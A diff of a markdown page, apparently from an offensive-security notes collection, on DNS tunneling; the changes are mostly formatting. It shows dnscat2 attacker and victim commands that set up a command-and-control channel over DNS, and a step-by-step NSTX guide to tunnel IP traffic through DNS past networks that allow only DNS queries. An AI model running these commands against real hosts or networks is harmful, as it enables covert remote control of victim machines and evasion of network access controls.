@@ -1,27 +1,27 @@
-# DNS Tunneling
+# ⭕ DNS Tunneling
 
 ## DNSCat2
 
-Establishes a C&C channel through DNS. It doesn't need root privileges.
+Establishes a C\&C channel through DNS. It doesn't need root privileges.
 
-```text
+```
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
 ```
 
 ## NSTX
 
-is a hack to tunnel IP traffic over DNS.If DNS traffic does not work, but ICMP traffic \(i.e., ping\) works, try ICMPTX: IP-over-ICMP. Note that these instructions play nicely with ICMPTX. You can run both on one proxy.
+is a hack to tunnel IP traffic over DNS.If DNS traffic does not work, but ICMP traffic (i.e., ping) works, try ICMPTX: IP-over-ICMP. Note that these instructions play nicely with ICMPTX. You can run both on one proxy.
 
 You need several things to get going:
 
-a DNS server that you can configure, \(we'll call this ns.example.com\) another server, one not running DNS. We're going to assume the IP address of this machine is 1.2.3.4. The reason you cannot run DNS on the same machine, is that you're going to run nstx on this machine. Nstx must run on port 53, like DNS. a crippled Internet connection, i.e., one that only allows you to issue DNS queries.
+a DNS server that you can configure, (we'll call this ns.example.com) another server, one not running DNS. We're going to assume the IP address of this machine is 1.2.3.4. The reason you cannot run DNS on the same machine, is that you're going to run nstx on this machine. Nstx must run on port 53, like DNS. a crippled Internet connection, i.e., one that only allows you to issue DNS queries.
 
 ### Configure a new DNS subdomain
 
 Let's assume you're running the domain "example.com". The nameserver for this domain is, as mentioned before, "ns.example.com". Configure "ns.example.com" by adding a subdomain, "tunnel.example.com". You do this by appending the following DNS records at the end of the zone file for "example.com":
 
-```text
+```
 ;
 ; subdomain for IP-over-DNS tunnelling
 ;
@@ -36,13 +36,13 @@ In other words. We configured 1.2.3.4 to be the name server for a new subdomain 
 
 On the machine 1.2.3.4, make sure your kernel supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:
 
-```text
+```
 apt-get install nstx
 ```
 
 Edit /etc/default/nstx and set NSTX\_DOMAIN to "tunnel.example.com" and set start\_nstxd to "yes". Finally, set ifup\_tun0 to "yes". In /etc/network/interfaces, define a new interface tun0, as follows:
 
-```text
+```
 iface tun0 inet static
   address 10.0.0.1
   netmask 255.0.0.0
@@ -50,13 +50,13 @@ iface tun0 inet static
 
 Now start the server by running:
 
-```text
+```
 /etc/init.d/nstxd restart
 ```
 
 If you're not running Debian, you can skip all that and just download the code, compile it manually, and start the server by hand and then configure the tun0 network device:
 
-```text
+```
 # nstxd tunnel.example.com
 # /sbin/modprobe tun
 # /sbin/ifconfig tun0 up 10.0.0.1 netmask 255.255.255.0
@@ -64,7 +64,7 @@ If you're not running Debian, you can skip all that and just download the code, 
 
 Whether you're running Debian or not, after running the nstx server, make sure you now have a tun0 device:
 
-```text
+```
 # /sbin/ifconfig tun0
 tun0      Link encap:UNSPEC  HWaddr XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX
           inet addr:10.0.0.1  P-t-P:10.0.0.1  Mask:255.0.0.0
@@ -75,9 +75,9 @@ tun0      Link encap:UNSPEC  HWaddr XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX-XX
           RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
 ```
 
-Now you need to enable forwarding on this server. I use iptables to implement masquerading. There are many HOWTOs about this \(a simple one, for example\). On Debian, the configuration file for iptables is in /var/lib/iptables/active. The relevant bit is:
+Now you need to enable forwarding on this server. I use iptables to implement masquerading. There are many HOWTOs about this (a simple one, for example). On Debian, the configuration file for iptables is in /var/lib/iptables/active. The relevant bit is:
 
-```text
+```
 *nat
 :PREROUTING ACCEPT [6:1596]
 :POSTROUTING ACCEPT [1:76]
@@ -89,19 +89,19 @@ COMMIT
 
 Restart iptables:
 
-```text
+```
 /etc/init.d/iptables restart
 ```
 
 and enable forwarding:
 
-```text
+```
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 You can make sure this is permanent by editing /etc/sysctl.conf:
 
-```text
+```
 net/ipv4/ip_forward=1
 ```
 
@@ -109,22 +109,22 @@ net/ipv4/ip_forward=1
 
 Make sure the kernel on the client machine also supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:
 
-```text
+```
 apt-get install nstx
 ```
 
 Edit /etc/default/nstx and set NSTX\_DOMAIN to "tunnel.example.com" and set start\_nstxcd to "yes". Finally, set ifup\_tun0 to "yes". In /etc/network/interfaces, define a new interface tun0, as follows:
 
-```text
+```
 iface tun0 inet static
   address 10.0.0.2
   netmask 255.0.0.0
   mtu 500 # optional, may solve ssh problems
 ```
 
-Marc Merlin points out that you may you want to add something like \(below the mtu line\)
+Marc Merlin points out that you may you want to add something like (below the mtu line)
 
-```text
+```
 post-up route del default; route add -net default gw 10.0.0.1
 ```
 
@@ -132,21 +132,21 @@ now you're sitting at an airport or in a cafe, and you have internet access and 
 
 Assuming you got an IP address through DHCP, you should now know the IP address of the DNS server they want you to use. Your /etc/resolv.conf will contain at least one "nameserver" entry. Make sure you use the first nameserver entry in /etc/resolv.conf and remove the others. For the sake of this example, let's call the first and remaining nameserver 66.77.88.99. Edit /etc/default/nstx and change set NSTX\_DNS\_SERVER to "66.77.88.99". The latest nstx Debian package obviates this manual step as follows:
 
-```text
+```
 NSTX_DNS_SERVER=`grep nameserver /etc/resolv.conf |head -1|awk '{print $2}'`
 ```
 
 That is, it simply sets NSTX\_DNS\_SERVER to the IP address of the first nameserver entry in /etc/resolv.conf.
 
-Now, \(re\)start the nstx client:
+Now, (re)start the nstx client:
 
-```text
+```
  /etc/init.d/nstxcd restart
 ```
 
 If you don't have Debian, start the client manually:
 
-```text
+```
 # nstxcd tunnel.example.com 66.77.88.99
 # /sbin/modprobe tun
 # /sbin/ifconfig tun0 up 10.0.0.2 netmask 255.255.255.0
@@ -154,7 +154,7 @@ If you don't have Debian, start the client manually:
 
 Make sure you now have a tun0 device:
 
-```text
+```
 # /sbin/ifconfig tun0
 tun0      Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00
           inet addr:10.0.0.2  P-t-P:10.0.0.2  Mask:255.0.0.0
@@ -167,7 +167,7 @@ tun0      Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00
 
 By running /sbin/route -n, figure out what your gateway is. It's the record with the "UG" Flags field. For example:
 
-```text
+```
 # /sbin/route -n
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
@@ -175,9 +175,9 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         192.168.1.1     0.0.0.0         UG    0      0        0 wlan0
 ```
 
-OK. So "192.168.1.1" is our gateway. Assuming your wireless network device is called "wlan0" \(but it might well be "eth1", or whatever\), run:
+OK. So "192.168.1.1" is our gateway. Assuming your wireless network device is called "wlan0" (but it might well be "eth1", or whatever), run:
 
-```text
+```
 # /sbin/route del default
 # /sbin/route add -host 66.77.88.99 gw 192.168.1.1 dev wlan0
 # /sbin/route add default gw 10.0.0.1 tun0
@@ -186,10 +186,3 @@ OK. So "192.168.1.1" is our gateway. Assuming your wireless network device is ca
 Notice that "192.168.1.1" is the IP address of the gateway we learned by running "/sbin/route -n". Similarly, "66.77.88.99" is the nameserver from /etc/resolv.conf. Make sure you plug in the correct IP address in both cases.
 
 You should now be all set. All DNS traffic is going straight to 66.77.88.99. All other traffic will be tunnelled through 1.2.3.4, via DNS.
-
-
-
-
-
-
-
